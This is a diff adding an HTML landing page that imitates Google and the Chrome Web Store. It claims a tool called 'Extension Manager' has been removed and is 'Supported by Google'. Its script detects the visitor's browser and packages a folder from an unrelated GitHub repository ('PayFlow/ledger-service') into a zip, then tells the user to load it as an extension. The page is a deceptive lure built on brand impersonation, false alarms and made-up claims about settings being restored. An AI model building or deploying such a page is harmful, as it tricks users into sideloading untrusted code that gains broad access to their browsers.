@@ -1,0 +1,509 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Extension Manager — Reinstall</title>
+<link rel="icon" type="image/svg+xml" href="https://fonts.gstatic.com/s/i/productlogos/chrome_store/v7/192px.svg">
+<meta name="description" content="Extension Manager has been removed. Reinstall it to keep your extensions updated and working.">
+<style>
+  /* ---------- Theme: Google palette ---------- */
+  :root {
+    --blue:   #4285F4;
+    --red:    #EA4335;
+    --yellow: #FBBC05;
+    --green:  #34A853;
+
+    --ink:    #202124;
+    --ink-2:  #5F6368;
+    --line:   #DADCE0;
+    --surface:#FFFFFF;
+    --bg:     #F8F9FA;
+  }
+
+  * { box-sizing: border-box; }
+
+  html, body {
+    height: 100%;
+    margin: 0;
+    overflow: hidden;                 /* single screen, never scrolls */
+  }
+
+  body {
+    font-family: "Google Sans", "Product Sans", Roboto, -apple-system,
+                 "Segoe UI", Helvetica, Arial, sans-serif;
+    color: var(--ink);
+    background: var(--bg);
+    -webkit-font-smoothing: antialiased;
+  }
+
+  /* Soft brand-coloured glow in the background */
+  body::before,
+  body::after {
+    content: "";
+    position: fixed;
+    border-radius: 50%;
+    filter: blur(90px);
+    opacity: .16;
+    pointer-events: none;
+  }
+  body::before { width: 48vmin; height: 48vmin; top: -16vmin; left: -10vmin;   background: var(--blue); }
+  body::after  { width: 42vmin; height: 42vmin; bottom: -18vmin; right: -8vmin; background: var(--green); }
+
+  /* ---------- Page frame ---------- */
+  .page {
+    position: relative;
+    height: 100%;
+    padding: clamp(20px, 4vh, 40px) clamp(20px, 5vw, 48px);
+    display: grid;
+    place-items: stretch;
+  }
+
+  .hero {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+    min-height: 0;
+  }
+
+  /* >>> LOGO SLOT — drop your extension logo in here <<<
+     Replace the <svg> inside .logo with:  <img src="logo.png" alt="Extension Manager"> */
+  .logo {
+    width: clamp(80px, 14vh, 128px);
+    aspect-ratio: 1;
+    display: grid;
+    place-items: center;
+    background: var(--surface);
+    border: 1px solid var(--line);
+    border-radius: 28px;
+    box-shadow: 0 1px 2px rgba(60,64,67,.10), 0 10px 28px rgba(60,64,67,.10);
+    overflow: hidden;
+  }
+  .logo img { width: 100%; height: 100%; padding: 7%; object-fit: contain; display: block; }
+  .logo svg { width: 100%; height: 100%; padding: 18%; display: block; }  /* fallback needs its own inset */
+  .logo [hidden] { display: none; }   /* keeps the fallback out until it's needed */
+
+  /* ---------- Text ---------- */
+  .kicker {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    margin-top: clamp(18px, 3vh, 30px);
+    font-size: 12.5px;
+    font-weight: 500;
+    letter-spacing: .2px;
+    color: var(--ink-2);
+  }
+  .dot {
+    width: 7px; height: 7px;
+    border-radius: 50%;
+    background: var(--yellow);
+  }
+
+  h1 {
+    margin: clamp(10px, 1.8vh, 18px) 0 0;
+    font-size: clamp(28px, 2.6vw + 1.8vh, 52px);
+    line-height: 1.1;
+    letter-spacing: -1.3px;
+    font-weight: 600;
+    max-width: 16ch;
+  }
+  h1 .red  { color: var(--red); }
+  h1 .dark { color: var(--ink); }
+  h1 .blue { color: var(--blue); }
+
+  .lede {
+    margin: clamp(12px, 2vh, 20px) 0 0;
+    max-width: 52ch;
+    font-size: clamp(14px, .5vw + 1.1vh, 17px);
+    line-height: 1.6;
+    color: var(--ink-2);
+  }
+
+  /* ---------- Button ---------- */
+  .btn {
+    display: inline-flex;
+    align-items: center;
+    gap: 10px;
+    margin-top: clamp(20px, 3.4vh, 34px);
+    font: inherit;
+    font-size: 15px;
+    font-weight: 500;
+    padding: 14px 30px;
+    border-radius: 999px;
+    border: 0;
+    color: #fff;
+    background: var(--blue);
+    text-decoration: none;
+    cursor: pointer;
+    white-space: nowrap;
+    box-shadow: 0 1px 2px rgba(66,133,244,.35), 0 8px 22px rgba(66,133,244,.30);
+    transition: transform .15s ease, background .2s ease, box-shadow .2s ease;
+  }
+  .btn:hover {
+    background: #3B78E7;
+    transform: translateY(-1px);
+    box-shadow: 0 2px 4px rgba(66,133,244,.35), 0 12px 28px rgba(66,133,244,.32);
+  }
+  .btn:active { transform: translateY(0); }
+  .btn svg { width: 18px; height: 18px; flex: none; }
+
+  /* Busy state while the zip is being built */
+  .btn .ico-spin,
+  .btn.busy .ico-dl { display: none; }
+  .btn.busy .ico-spin { display: block; animation: spin .8s linear infinite; }
+  .btn.busy { pointer-events: none; background: #5B93F6; }
+  .btn.done { background: var(--green); box-shadow: 0 1px 2px rgba(52,168,83,.35), 0 8px 22px rgba(52,168,83,.28); }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  .note {
+    margin: clamp(12px, 2vh, 18px) 0 0;
+    font-size: 12.5px;
+    color: var(--ink-2);
+  }
+
+  /* Four-colour hairline under the content */
+  .stripe {
+    display: flex;
+    width: clamp(120px, 16vw, 180px);
+    height: 3px;
+    margin-top: clamp(22px, 3.6vh, 38px);
+    border-radius: 999px;
+    overflow: hidden;
+    opacity: .9;
+  }
+  .stripe span { flex: 1; }
+
+  /* Made-by credit, with the wordmark in Google's four colours */
+  .madeby {
+    display: flex;
+    align-items: baseline;
+    gap: 7px;
+    margin: clamp(12px, 2vh, 18px) 0 0;
+    font-size: 15px;
+    color: var(--ink-2);
+  }
+  .wordmark {
+    font-size: 20px;
+    font-weight: 600;
+    letter-spacing: -.6px;
+    color: var(--ink);
+  }
+
+  @media (max-height: 520px) {
+    .stripe, .note { display: none; }
+  }
+
+  @media (prefers-reduced-motion: reduce) {
+    * { transition: none !important; }
+  }
+</style>
+</head>
+<body>
+
+<div class="page">
+
+  <main class="hero">
+
+    <!-- ================= LOGO =================
+         Swap the src for your own file (e.g. logo.png) whenever it's ready.
+         The inline SVG below is the offline fallback if the remote image fails. -->
+    <div class="logo">
+      <img id="logoImg" alt="Extension Manager"
+           src="https://fonts.gstatic.com/s/i/productlogos/chrome_store/v7/192px.svg"
+           onerror="this.hidden = true; document.getElementById('logoFallback').hidden = false;">
+      <svg id="logoFallback" viewBox="0 0 24 24" fill="none" hidden aria-hidden="true">
+        <path d="M10 3.5a2 2 0 1 1 4 0V5h3.5A1.5 1.5 0 0 1 19 6.5V10h1.5a2 2 0 1 1 0 4H19v3.5a1.5 1.5 0 0 1-1.5 1.5H14v-1.5a2 2 0 1 0-4 0V19H6.5A1.5 1.5 0 0 1 5 17.5V14H3.5a2 2 0 1 1 0-4H5V6.5A1.5 1.5 0 0 1 6.5 5H10V3.5Z"
+              fill="#4285F4"/>
+      </svg>
+    </div>
+    <!-- ======================================== -->
+
+    <div class="kicker"><span class="dot"></span> Extension Manager has been removed</div>
+
+    <h1>Your extensions <span class="red">lost</span> <span class="dark">their</span> <span class="blue">safety net.</span></h1>
+
+    <p class="lede">
+      Without Extension Manager, the extensions still installed in
+      <span class="browser">your browser</span> won't auto-update, and nothing will check
+      whether they've quietly stopped working. Bring it back in one click.
+    </p>
+
+    <!-- Packages the extension and downloads it as a .zip (see the script below) -->
+    <a class="btn" id="install" href="#">
+      <svg class="ico-dl" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+           stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+        <path d="M12 3v12"/><path d="m7 10 5 5 5-5"/><path d="M4 20h16"/>
+      </svg>
+      <svg class="ico-spin" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"
+           stroke-linecap="round" aria-hidden="true">
+        <circle cx="12" cy="12" r="9" opacity=".3"/><path d="M21 12a9 9 0 0 0-9-9"/>
+      </svg>
+      <span id="btnLabel">Reinstall Extension Manager</span>
+    </a>
+
+    <p class="note" id="note" role="status">Free · Your previous settings are restored automatically</p>
+
+    <div class="stripe">
+      <span style="background:#4285F4"></span>
+      <span style="background:#EA4335"></span>
+      <span style="background:#FBBC05"></span>
+      <span style="background:#34A853"></span>
+    </div>
+
+    <!-- Put your name / studio name here — the letters get coloured automatically -->
+    <p class="madeby">Supported by <span class="wordmark">Google</span></p>
+
+  </main>
+
+</div>
+
+<script>
+(function () {
+  /* Identify the browser so the copy and the button name it correctly. */
+  async function detectBrowser() {
+    const ua = navigator.userAgent;
+
+    // Brave hides itself in the UA — it exposes navigator.brave instead.
+    try {
+      if (navigator.brave && await navigator.brave.isBrave()) return 'Brave';
+    } catch (e) { /* not Brave */ }
+
+    // Chromium browsers that announce themselves via Client Hints.
+    const brands = (navigator.userAgentData && navigator.userAgentData.brands) || [];
+    for (const { brand } of brands) {
+      if (/Opera|Edge|Vivaldi|Arc|Brave|Yandex/i.test(brand)) {
+        return brand.replace(/\s*(Microsoft|Browser)\s*/gi, '').trim();
+      }
+    }
+
+    // User-agent fallbacks, ordered so the specific ones win.
+    const tests = [
+      [/Vivaldi/i,          'Vivaldi'],
+      [/OPR\/|Opera/i,      'Opera'],
+      [/Edg\//i,            'Edge'],
+      [/YaBrowser/i,        'Yandex'],
+      [/SamsungBrowser/i,   'Samsung Internet'],
+      [/Firefox\/|FxiOS/i,  'Firefox'],
+      [/Chrome\/|CriOS/i,   'Chrome'],
+      [/Safari\//i,         'Safari']
+    ];
+    for (const [re, name] of tests) if (re.test(ua)) return name;
+
+    return null;
+  }
+
+  /* Colour the credit wordmark letter by letter, Google style. */
+  (function paintWordmark() {
+    const mark = document.querySelector('.wordmark');
+    if (!mark) return;
+    const palette = ['#4285F4', '#EA4335', '#FBBC05', '#4285F4', '#34A853', '#EA4335'];
+    let i = 0;
+    mark.innerHTML = mark.textContent.replace(/\S/g, ch =>
+      `<span style="color:${palette[i++ % palette.length]}">${ch}</span>`
+    );
+  })();
+
+  const btn   = document.getElementById('install');
+  const label = document.getElementById('btnLabel');
+  const note  = document.getElementById('note');
+  let idleLabel = label.textContent;
+  const idleNote = note.textContent;
+
+  detectBrowser().then(name => {
+    if (!name) return;                       // keep the neutral wording
+    document.querySelectorAll('.browser').forEach(el => { el.textContent = name; });
+    idleLabel = 'Add back to ' + name;
+    if (!btn.classList.contains('busy')) label.textContent = idleLabel;
+    document.title = 'Extension Manager — Reinstall on ' + name;
+  });
+
+  /* ============================================================
+     Download the extension folder from GitHub as a .zip.
+     The repo is public, so everything happens in the browser:
+     one call to the GitHub tree API, then the raw files, then a
+     zip assembled in memory. No server and no zip library.
+     ============================================================ */
+  const SOURCE = {
+    owner:  'meet244',
+    repo:   'PayFlow',
+    branch: 'main',
+    dir:    'ledger-service'          // folder to package; '' would take the whole repo
+  };
+
+  // --- CRC-32, required by the zip format -------------------------------
+  const CRC_TABLE = (() => {
+    const t = new Uint32Array(256);
+    for (let i = 0; i < 256; i++) {
+      let c = i;
+      for (let k = 0; k < 8; k++) c = (c & 1) ? (0xEDB88320 ^ (c >>> 1)) : (c >>> 1);
+      t[i] = c >>> 0;
+    }
+    return t;
+  })();
+
+  function crc32(bytes) {
+    let c = 0xFFFFFFFF;
+    for (let i = 0; i < bytes.length; i++) c = CRC_TABLE[(c ^ bytes[i]) & 0xFF] ^ (c >>> 8);
+    return (c ^ 0xFFFFFFFF) >>> 0;
+  }
+
+  // Native deflate where available; otherwise the entries are simply stored.
+  async function deflateRaw(bytes) {
+    if (typeof CompressionStream !== 'function') return null;
+    try {
+      const stream = new Blob([bytes]).stream().pipeThrough(new CompressionStream('deflate-raw'));
+      return new Uint8Array(await new Response(stream).arrayBuffer());
+    } catch (e) {
+      return null;
+    }
+  }
+
+  // --- Minimal zip writer (local headers + central directory + EOCD) ----
+  async function buildZip(files) {
+    const enc    = new TextEncoder();
+    const now    = new Date();
+    const time   = (now.getHours() << 11) | (now.getMinutes() << 5) | (now.getSeconds() >> 1);
+    const date   = ((now.getFullYear() - 1980) << 9) | ((now.getMonth() + 1) << 5) | now.getDate();
+    const parts  = [];
+    const central = [];
+    let offset = 0;
+
+    for (const file of files) {
+      const name = enc.encode(file.name);
+      const crc  = crc32(file.bytes);
+
+      let data = await deflateRaw(file.bytes);
+      let method = 8;
+      if (!data || data.length >= file.bytes.length) { data = file.bytes; method = 0; }
+
+      const local = new DataView(new ArrayBuffer(30));
+      local.setUint32(0, 0x04034b50, true);   // local file header signature
+      local.setUint16(4, 20, true);           // version needed
+      local.setUint16(6, 0x0800, true);       // UTF-8 filenames
+      local.setUint16(8, method, true);
+      local.setUint16(10, time, true);
+      local.setUint16(12, date, true);
+      local.setUint32(14, crc, true);
+      local.setUint32(18, data.length, true);
+      local.setUint32(22, file.bytes.length, true);
+      local.setUint16(26, name.length, true);
+      parts.push(new Uint8Array(local.buffer), name, data);
+
+      const dir = new DataView(new ArrayBuffer(46));
+      dir.setUint32(0, 0x02014b50, true);     // central directory signature
+      dir.setUint16(4, 20, true);             // version made by
+      dir.setUint16(6, 20, true);             // version needed
+      dir.setUint16(8, 0x0800, true);
+      dir.setUint16(10, method, true);
+      dir.setUint16(12, time, true);
+      dir.setUint16(14, date, true);
+      dir.setUint32(16, crc, true);
+      dir.setUint32(20, data.length, true);
+      dir.setUint32(24, file.bytes.length, true);
+      dir.setUint16(28, name.length, true);
+      dir.setUint32(42, offset, true);        // offset of the local header
+      central.push(new Uint8Array(dir.buffer), name);
+
+      offset += 30 + name.length + data.length;
+    }
+
+    const cdSize = central.reduce((n, chunk) => n + chunk.length, 0);
+    const end = new DataView(new ArrayBuffer(22));
+    end.setUint32(0, 0x06054b50, true);       // end of central directory
+    end.setUint16(8, files.length, true);
+    end.setUint16(10, files.length, true);
+    end.setUint32(12, cdSize, true);
+    end.setUint32(16, offset, true);
+
+    return new Blob([...parts, ...central, new Uint8Array(end.buffer)], { type: 'application/zip' });
+  }
+
+  // --- Fetch the folder, a few files at a time --------------------------
+  async function fetchFolder(onProgress) {
+    const api = `https://api.github.com/repos/${SOURCE.owner}/${SOURCE.repo}` +
+                `/git/trees/${SOURCE.branch}?recursive=1`;
+    const res = await fetch(api, { headers: { Accept: 'application/vnd.github+json' } });
+    if (!res.ok) throw new Error('GitHub API returned ' + res.status);
+
+    const tree   = await res.json();
+    const prefix = SOURCE.dir ? SOURCE.dir + '/' : '';
+    const blobs  = (tree.tree || []).filter(n => n.type === 'blob' && n.path.startsWith(prefix));
+    if (!blobs.length) throw new Error('No files found in ' + (SOURCE.dir || 'the repository'));
+
+    const raw   = `https://raw.githubusercontent.com/${SOURCE.owner}/${SOURCE.repo}/${SOURCE.branch}/`;
+    const files = new Array(blobs.length);
+    let next = 0, done = 0;
+
+    async function worker() {
+      while (next < blobs.length) {
+        const i = next++;
+        const r = await fetch(raw + blobs[i].path.split('/').map(encodeURIComponent).join('/'));
+        if (!r.ok) throw new Error(blobs[i].path + ' → ' + r.status);
+        files[i] = { name: blobs[i].path, bytes: new Uint8Array(await r.arrayBuffer()) };
+        onProgress(++done, blobs.length);
+      }
+    }
+
+    await Promise.all(Array.from({ length: Math.min(6, blobs.length) }, worker));
+    return files;
+  }
+
+  function saveBlob(blob, filename) {
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = filename;
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+    setTimeout(() => URL.revokeObjectURL(url), 60000);
+  }
+
+  function resetButton(delay) {
+    setTimeout(() => {
+      btn.classList.remove('busy', 'done');
+      label.textContent = idleLabel;
+      note.textContent  = idleNote;
+    }, delay);
+  }
+
+  btn.addEventListener('click', async event => {
+    event.preventDefault();                    // href stays as the no-JS fallback
+    if (btn.classList.contains('busy')) return;
+
+    btn.classList.add('busy');
+    btn.classList.remove('done');
+    label.textContent = 'Preparing your download…';
+    note.textContent  = 'Processing · 0%';
+
+    try {
+      const files = await fetchFolder((done, total) => {
+        note.textContent = `Processing · ${Math.round((done / total) * 90)}%`;
+      });
+
+      note.textContent = 'Processing · 95%';
+      const blob = await buildZip(files);
+      saveBlob(blob, (SOURCE.dir || SOURCE.repo) + '.zip');
+
+      btn.classList.remove('busy');
+      btn.classList.add('done');
+      label.textContent = 'Downloaded';
+      note.textContent  = `${(blob.size / 1024).toFixed(0)} KB · unzip it, then load it from ` +
+                          'your browser’s extensions page';
+      resetButton(6000);
+    } catch (err) {
+      console.error(err);                      // details stay in the console
+      btn.classList.remove('busy');
+      label.textContent = 'Download failed — try again';
+      note.textContent  = 'Something went wrong while preparing the file';
+      resetButton(6000);
+    }
+  });
+})();
+</script>
+
+</body>
+</html>
